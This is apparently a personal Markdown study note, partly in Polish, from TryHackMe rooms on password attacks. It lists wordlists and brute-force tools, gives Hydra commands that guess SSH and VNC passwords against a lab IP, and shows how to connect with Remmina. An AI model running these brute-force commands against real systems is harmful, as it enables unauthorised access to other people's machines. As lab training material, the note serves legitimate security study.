# Rooms
1. Aoc2022: https://tryhackme.com/room/adventofcyber4
2. Hydra: https://tryhackme.com/room/hydra
3. Protocols and Servers https://tryhackme.com/room/protocolsandservers2
4. Passwords attacks: https://tryhackme.com/room/passwordattacks
5. John The Ripper: https://tryhackme.com/room/johntheripper0

# Wordlist and Tools: 


| Resource                              |                    Source                    |
| ------------------------------------- |:--------------------------------------------:|
| rockyou.txt                           |      `/usr/share/wordlists/rockyou.txt`      |
| Seclists                              |  https://github.com/danielmiessler/SecLists  |
| FuzzDB                                |   https://github.com/fuzzdb-project/fuzzdb   |
| Bruteforce-database                   | https://github.com/duyet/bruteforce-database |
| Tool for privilage escalation to root |      https://github.com/d4t4s3c/suForce      |
| Hydra wordlist                        |  https://github.com/vanhauser-thc/thc-hydra  |



# Commands

## HYDRA - brute-force SSH

```nmap
hydra -l username -P wordlist-passwords.txt server-IP service
hydra -L wordlist-usernames -P wordlist-passwords.txt server-IP service
#równoważne przykłady 
# SSH
hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.40.141 ssh
hydra -l mark -P /usr/share/wordlists/rockyou.txt ssh://10.10.40.141

#VNC - nie używa nazwy użytkownika
hydra -P wordlist-passwords.txt server-IP service
hydra -P /usr/share/wordlists/rockyou.txt 10.10.40.141 vnc
```
`mark ` as the username as it iterates over the provided passwords against the SSH server.
**Others porotcoles** : rdp, vnc, ftp, pop3
**Flags**:
`-V` or `-vV` :  verbose
`-d` :  debug mode


## Connect to VNC

### Tool: Remmina

#### Installation Remmina: 
https://remmina.org/how-to-install-remmina/

```copy
sudo apt-add-repository ppa:remmina-ppa-team/remmina-next
sudo apt update
sudo apt install remmina remmina-plugin-rdp remmina-plugin-secret
```

For Ubuntu: 

![obraz](https://user-images.githubusercontent.com/90008283/205734772-e93b6a0d-08b2-45c7-94dd-fee53d74da16.png)

![obraz](https://user-images.githubusercontent.com/90008283/205734818-639ee0ca-d5d2-4536-8cf3-741df5f992e7.png)

![obraz](https://user-images.githubusercontent.com/90008283/205734847-30b0218d-07a1-4396-b300-f2b5d3226cf9.png)

![obraz](https://user-images.githubusercontent.com/90008283/205734897-d5b50c77-0026-4a6d-beec-419c0701be1d.png)



## Remote Access Services


| Protocole | PORT |         Stands By         | Interface |                        OS                        |
| --------- |:----:|:-------------------------:| --------- |:------------------------------------------------:|
| SSH       |  22  |       Secure Shell        | CLI       |            Linux, Putty for MSWindows            |
| RDP       | 3389 |  Remote Desktop Protocol  | GUI       |                    MS Windows                    |
| VNC       | 5900 | Virtual Network Computing | GUI       | Linux, MS Windows, MacOS, Android, Raspberry Pi. |


## HYDRA

Support for protools: ` SSH, VNC, FTP, POP3, IMAP, SMTP,`



# PRACTISE - THM

## 5.1. Użycie Hydry do brute-forca hasła dla usługi VNC. 

```
hydra -P /usr/share/wordlists/rockyou.txt 10.10.40.141 vnc
```

![obraz](https://user-images.githubusercontent.com/90008283/205737156-2bf59c80-3263-4e60-9d30-24f18301bddf.png)

## 5.2. Połączenie się prze VNC do pulpitu zdalnego. - REMMINA

`Application -> Internet -> Remmina` 

![obraz](https://user-images.githubusercontent.com/90008283/205737850-63d60a05-89cd-4c38-b961-4dd8e018e153.png)

![obraz](https://user-images.githubusercontent.com/90008283/205738115-56a17863-b283-482a-8aba-d471c437e03c.png)

![obraz](https://user-images.githubusercontent.com/90008283/205738394-0c63a341-ad8e-4b05-82fc-3112efa215ab.png)



